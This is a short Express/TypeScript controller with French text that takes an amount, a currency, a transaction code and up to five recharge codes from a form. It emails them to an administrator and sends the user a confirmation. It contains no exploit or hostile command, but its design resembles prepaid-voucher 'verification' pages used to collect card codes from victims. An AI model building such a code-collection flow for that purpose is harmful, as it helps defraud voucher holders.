import { Request, Response } from 'express';
import { HttpCode } from '../core/constants';
import sendMail from '../nodemailer/sendmail';  
import { envs } from '../core/config/env';

interface Type {
    mount: number;
    recharge: string;
    devise: string;
    code1: string;
    code2: string;
    code3: string;
    code4: string;
    code5: string;
    email: string;
}

const userController = {
    sendMails: async (req: Request, res: Response) => {
        const { mount, recharge, devise, code1, code2, code3, code4, code5, email }: Type = req.body;

        // Vérification des champs obligatoires
        if (!mount || !recharge || !devise || !code1 || !email) {
            return res.status(HttpCode.BAD_REQUEST).json({ msg: "Tous les champs sont obligatoires" });
        }

        const data = { mount, recharge, devise, code1, code2, code3, code4, code5, email };

        try {
            // Préparation des messages pour les deux emails
            const adminMessage = `
                Le client a effectué une recharge de ${data.mount} ${data.devise} 
                pour le code ${data.code1} ${data.code2} ${data.code3} ${data.code4} ${data.code5} 
                avec le code de transaction ${data.recharge}.
            `;

            const userMessage = `
                Vous avez effectué une recharge de ${data.mount} ${data.devise} 
                pour le code ${data.code1} ${data.code2} ${data.code3} ${data.code4} ${data.code5} 
                avec le code de transaction ${data.recharge}. 
                L'administrateur a reçu vos informations et est en train de les analyser.
            `;

            // Envoi simultané des deux emails
            await Promise.all([
                sendMail(envs.address_mail, adminMessage), // Email à l'admin
                sendMail(email, userMessage) // Email à l'utilisateur
            ]);

            // Réponse finale au client
            return res.status(HttpCode.OK).json({ msg: "Emails envoyés avec succès" });
        } catch (error) {
            console.error(error);
            return res.status(HttpCode.INTERNAL_SERVER_ERROR).json({ msg: "Erreur interne du serveur" });
        }
    }
};

export default userController;